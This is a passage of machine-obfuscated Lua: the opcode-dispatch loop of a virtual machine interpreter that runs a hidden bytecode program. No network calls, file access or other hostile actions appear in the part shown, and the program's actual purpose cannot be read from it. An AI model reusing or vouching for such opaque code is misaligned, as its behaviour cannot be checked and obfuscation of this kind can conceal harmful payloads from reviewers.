w[y[94]]=w[y[63]][w[y[758]]];else if q==13 then n=n+1;else y=f[n];end end end else if q<=16 then if q>15 then ba={w[bb](w[bb+1])};else bb=y[94]end else if q<=17 then x=0;else if 18==q then for bc=bb,y[758]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end end;elseif(107>z or 107==z)then local q,x=0 while true do if(q<14 or q==14)then if(q<6 or q==6)then if q<=2 then if(q<0 or q==0)then x=nil else if(q~=2)then w[y[94]]=w[y[63]][y[758]];else n=(n+1);end end else if(q<=4)then if q>3 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end else if q<6 then n=(n+1);else y=f[n];end end end else if(q<10 or q==10)then if(q<=8)then if 8>q then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if not(10==q)then y=f[n];else w[y[94]]=w[y[63]]*y[758];end end else if q<=12 then if(12~=q)then n=n+1;else y=f[n];end else if(13<q)then n=(n+1);else w[y[94]]=w[y[63]]+w[y[758]];end end end end else if q<=22 then if q<=18 then if(q<=16)then if q<16 then y=f[n];else w[y[94]]=j[y[63]];end else if q~=18 then n=(n+1);else y=f[n];end end else if q<=20 then if(q~=20)then w[y[94]]=w[y[63]][y[758]];else n=(n+1);end else if(22>q)then y=f[n];else w[y[94]]=w[y[63]];end end end else if q<=26 then if(q<=24)then if not(24==q)then n=(n+1);else y=f[n];end else if q>25 then n=n+1;else w[y[94]]=(w[y[63]]+w[y[758]]);end end else if q<=28 then if(q<28)then y=f[n];else x=y[94]end else if q==29 then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=(q+1)end elseif(109>z)then local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if q~=1 then w[y[94]]={};else n=n+1;end else if q<=2 then y=f[n];else if q==3 then w[y[94]]={};else n=n+1;end end end else if q<=6 then if 5==q then y=f[n];else w[y[94]]={};end else if q<=7 then n=n+1;else if q>8 then w[y[94]]={};else y=f[n];end end end end else if q<=14 then if q<=11 then if 10<q then y=f[n];else n=n+1;end else if q<=12 then w[y[94]]={};else if 13==q then n=n+1;else y=f[n];end end end else if q<=16 then if 16>q then w[y[94]]=y[63];else n=n+1;end else if q<=17 then y=f[n];else if q~=19 then w[y[94]]=w[y[63]][w[y[758]]];else break end end end end end q=q+1 end else local q,x,ba,bb=0 while true do if q<=15 then if q<=7 then if q<=3 then if q<=1 then if 1>q then x=nil else ba=nil end else if 2<q then w[y[94]]=h[y[63]];else bb=nil end end else if q<=5 then if q<5 then n=n+1;else y=f[n];end else if q~=7 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end end end else if q<=11 then if q<=9 then if 8==q then y=f[n];else w[y[94]]=h[y[63]];end else if 11~=q then n=n+1;else y=f[n];end end else if q<=13 then if q<13 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if 15>q then y=f[n];else w[y[94]]=w[y[63]][w[y[758]]];end end end end else if q<=23 then if q<=19 then if q<=17 then if q<17 then n=n+1;else y=f[n];end else if q==18 then w[y[94]]=h[y[63]];else n=n+1;end end else if q<=21 then if q~=21 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end else if q==22 then n=n+1;else y=f[n];end end end else if q<=27 then if q<=25 then if q>24 then n=n+1;else w[y[94]]=w[y[63]][y[758]];end else if 27>q then y=f[n];else bb=y[63];end end else if q<=29 then if q<29 then ba=y[758];else x=k(w,g,bb,ba);end else if 31>q then w[y[94]]=x;else break end end end end end q=q+1 end end;elseif 112>=z then if 110>=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])elseif 111==z then local q;local x;local ba;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;else w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;end;elseif z<=113 then w[y[94]][y[63]]=y[758];elseif 114<z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])end;elseif 126>=z then if z<=120 then if z<=117 then if(117>z)then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if 0==q then x=nil else w[y[94]][y[63]]=w[y[758]];end else if q==2 then n=n+1;else y=f[n];end end else if q<=5 then if q>4 then n=n+1;else w[y[94]]={};end else if 7>q then y=f[n];else w[y[94]][y[63]]=y[758];end end end else if q<=11 then if q<=9 then if q>8 then y=f[n];else n=n+1;end else if q<11 then w[y[94]][y[63]]=w[y[758]];else n=n+1;end end else if q<=13 then if 13>q then y=f[n];else x=y[94]end else if 15>q then w[x]=w[x](r(w,x+1,y[63]))else break end end end end q=q+1 end else local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if 1>q then x=nil else w[y[94]]=w[y[63]][y[758]];end else if 2==q then n=n+1;else y=f[n];end end else if q<=5 then if q==4 then w[y[94]]=h[y[63]];else n=n+1;end else if q<=6 then y=f[n];else if q<8 then w[y[94]]=w[y[63]][w[y[758]]];else n=n+1;end end end end else if q<=13 then if q<=10 then if 9<q then w[y[94]]=h[y[63]];else y=f[n];end else if q<=11 then n=n+1;else if q>12 then w[y[94]]=w[y[63]][y[758]];else y=f[n];end end end else if q<=15 then if q~=15 then n=n+1;else y=f[n];end else if q<=16 then x=y[94]else if 17==q then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end end;elseif z<=118 then local q,x,ba,bb=0 while true do if q<=9 then if q<=4 then if q<=1 then if q==0 then x=nil else ba=nil end else if q<=2 then bb=nil else if q<4 then w[y[94]]=h[y[63]];else n=n+1;end end end else if q<=6 then if q>5 then w[y[94]]=h[y[63]];else y=f[n];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[94]]=w[y[63]][y[758]];end end end end else if q<=14 then if q<=11 then if q<11 then n=n+1;else y=f[n];end else if q<=12 then w[y[94]]=w[y[63]][w[y[758]]];else if q==13 then n=n+1;else y=f[n];end end end else if q<=16 then if 16~=q then bb=y[94]else ba={w[bb](w[bb+1])};end else if q<=17 then x=0;else if 19~=q then for bc=bb,y[758]do x=x+1;w[bc]=ba[x];end else break end end end end end q=q+1 end elseif 120>z then if(w[y[94]]~=w[y[758]])then n=y[63];else n=n+1;end;else local q=y[94]local x={w[q](r(w,q+1,y[63]))};local ba=0;for bb=q,y[758]do ba=ba+1;w[bb]=x[ba];end;end;elseif z<=123 then if z<=121 then h[y[63]]=w[y[94]];elseif 123>z then local q=w[y[758]];if q then n=n+1;else w[y[94]]=q;n=y[63];end;else local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif z<=124 then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif 125==z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=false;n=n+1;y=f[n];q=y[94]w[q](w[q+1])else local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=#w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94];w[q]=w[q]-w[q+2];n=y[63];end;elseif z<=132 then if 129>=z then if 127>=z then local q;w={};for x=0,u,1 do if x<o then w[x]=s[x+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])elseif 129>z then w[y[94]]=w[y[63]]/y[758];else local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])end;elseif z<=130 then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif z==131 then if(w[y[94]]<w[y[758]])then n=n+1;else n=y[63];end;else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 135>=z then if z<=133 then w[y[94]]={};elseif 135>z then local q;w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=y[758];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q=y[94];do return r(w,q,p)end;end;elseif 136>=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()elseif 137<z then local q=y[94];local x=w[y[63]];w[q+1]=x;w[q]=x[w[y[758]]];else local q=y[94]w[q](r(w,q+1,p))end;elseif z<=161 then if 149>=z then if 143>=z then if z<=140 then if 139<z then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[63];x=y[758];q=k(w,g,ba,x);w[y[94]]=q;end;elseif z<=141 then a(c,e);elseif 142<z then n=y[63];else j[y[63]]=w[y[94]];end;elseif 146>=z then if 144>=z then local q;w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif z>145 then if(w[y[94]]<=w[y[758]])then n=y[63];else n=n+1;end;else w[y[94]]=false;end;elseif 147>=z then local q;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif 148==z then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];for q=y[94],y[63],1 do w[q]=nil;end;n=n+1;y=f[n];n=y[63];else w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;end;elseif z<=155 then if z<=152 then if z<=150 then local q=y[94];local x,ba,bb=w[q],w[q+1],w[q+2];local x=x+bb;w[q]=x;if bb>0 and x<=ba or bb<0 and x>=ba then n=y[63];w[q+3]=x;end;elseif 151<z then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if(w[y[94]]~=w[y[758]])then n=n+1;else n=y[63];end;else local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q]()end;elseif 153>=z then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])elseif z>154 then w[y[94]]=false;else w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+y[758];n=n+1;y=f[n];h[y[63]]=w[y[94]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]();end;elseif 158>=z then if z<=156 then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))elseif 157==z then for q=y[94],y[63],1 do w[q]=nil;end;else local q;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))end;elseif z<=159 then do return end;elseif 160==z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]]*y[758];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]]+w[y[758]];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][w[y[63]]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];q=y[94]w[q]=w[q](w[q+1])end;elseif z<=173 then if 167>=z then if 164>=z then if 162>=z then local q;local x;local ba;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end elseif 164~=z then local q;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else w[y[94]]={r({},1,y[63])};end;elseif z<=165 then local q;local x;w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]={r({},1,y[63])};n=n+1;y=f[n];w[y[94]]=w[y[63]];n=n+1;y=f[n];x=y[94];q=w[x];for ba=x+1,y[63]do t(q,w[ba])end;elseif 166==z then w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else n=y[63];end;else w[y[94]][y[63]]=y[758];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];end;elseif 170>=z then if 168>=z then local q,x=0 while true do if q<=7 then if q<=3 then if q<=1 then if q~=1 then x=nil else w[y[94]][y[63]]=w[y[758]];end else if 2<q then y=f[n];else n=n+1;end end else if q<=5 then if 4<q then n=n+1;else w[y[94]]={};end else if 6==q then y=f[n];else w[y[94]][y[63]]=y[758];end end end else if q<=11 then if q<=9 then if q<9 then n=n+1;else y=f[n];end else if q<11 then w[y[94]][y[63]]=w[y[758]];else n=n+1;end end else if q<=13 then if q>12 then x=y[94]else y=f[n];end else if q>14 then break else w[x]=w[x](r(w,x+1,y[63]))end end end end q=q+1 end elseif 170>z then local q,x,ba,bb,bc=0 while true do if q<=11 then if q<=5 then if q<=2 then if q<=0 then x=nil else if 1<q then bc=nil else ba,bb=nil end end else if q<=3 then w[y[94]]=w[y[63]][w[y[758]]];else if 5~=q then n=n+1;else y=f[n];end end end else if q<=8 then if q<=6 then w[y[94]]=w[y[63]];else if 7<q then y=f[n];else n=n+1;end end else if q<=9 then w[y[94]]=y[63];else if q<11 then n=n+1;else y=f[n];end end end end else if q<=17 then if q<=14 then if q<=12 then w[y[94]]=y[63];else if 14>q then n=n+1;else y=f[n];end end else if q<=15 then w[y[94]]=y[63];else if 17~=q then n=n+1;else y=f[n];end end end else if q<=20 then if q<=18 then bc=y[94]else if q>19 then p=bb+bc-1 else ba,bb=i(w[bc](r(w,bc+1,y[63])))end end else if q<=21 then x=0;else if 23>q then for bb=bc,p do x=x+1;w[bb]=ba[x];end;else break end end end end end q=q+1 end else local q,x=0 while true do if q<=8 then if q<=3 then if q<=1 then if q==0 then x=nil else w[y[94]]=j[y[63]];end else if 3>q then n=n+1;else y=f[n];end end else if q<=5 then if q<5 then w[y[94]]=w[y[63]][y[758]];else n=n+1;end else if q<=6 then y=f[n];else if q<8 then w[y[94]]=y[63];else n=n+1;end end end end else if q<=13 then if q<=10 then if q==9 then y=f[n];else w[y[94]]=y[63];end else if q<=11 then n=n+1;else if q>12 then w[y[94]]=y[63];else y=f[n];end end end else if q<=15 then if 15~=q then n=n+1;else y=f[n];end else if q<=16 then x=y[94]else if 18>q then w[x]=w[x](r(w,x+1,y[63]))else break end end end end end q=q+1 end end;elseif 171>=z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=false;n=n+1;y=f[n];q=y[94]w[q](w[q+1])elseif 172==z then local q;w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];w[y[94]]=y[63];n=n+1;y=f[n];q=y[94]w[q]=w[q](r(w,q+1,y[63]))else local q;local x;local ba;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif z<=179 then if z<=176 then if z<=174 then local q=y[94];local x=w[q];for ba=q+1,y[63]do t(x,w[ba])end;elseif z~=176 then local q;local x;local ba;w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end else local q;local x;local ba;w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];ba=y[94]x={w[ba](w[ba+1])};q=0;for bb=ba,y[758]do q=q+1;w[bb]=x[q];end end;elseif 177>=z then local q=y[94]w[q]=w[q](r(w,q+1,p))elseif 178==z then w[y[94]]={r({},1,y[63])};else local q=y[94]local x={w[q](r(w,q+1,y[63]))};local ba=0;for bb=q,y[758]do ba=ba+1;w[bb]=x[ba];end;end;elseif z<=182 then if z<=180 then local q=0 while true do if q<=9 then if q<=4 then if q<=1 then if 0==q then w[y[94]]=w[y[63]]/y[758];else n=n+1;end else if q<=2 then y=f[n];else if q==3 then w[y[94]]=w[y[63]]-w[y[758]];else n=n+1;end end end else if q<=6 then if q<6 then y=f[n];else w[y[94]]=w[y[63]]/y[758];end else if q<=7 then n=n+1;else if q==8 then y=f[n];else w[y[94]]=w[y[63]]*y[758];end end end end else if q<=14 then if q<=11 then if q>10 then y=f[n];else n=n+1;end else if q<=12 then w[y[94]]=w[y[63]];else if q==13 then n=n+1;else y=f[n];end end end else if q<=16 then if 15==q then w[y[94]]=w[y[63]];else n=n+1;end else if q<=17 then y=f[n];else if q>18 then break else n=y[63];end end end end end q=q+1 end elseif z==181 then local q=y[94];local x=w[y[63]];w[q+1]=x;w[q]=x[w[y[758]]];else w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=w[y[63]][w[y[758]]];n=n+1;y=f[n];if(w[y[94]]~=y[758])then n=n+1;else n=y[63];end;end;elseif z<=183 then w={};for q=0,u,1 do if q<o then w[q]=s[q+1];else break;end;end;n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];w[y[94]]=h[y[63]];n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]]={};n=n+1;y=f[n];w[y[94]][y[63]]=w[y[758]];n=n+1;y=f[n];w[y[94]]=j[y[63]];n=n+1;y=f[n];w[y[94]]=w[y[63]][y[758]];n=n+1;y=f[n];if w[y[94]]then n=n+1;else 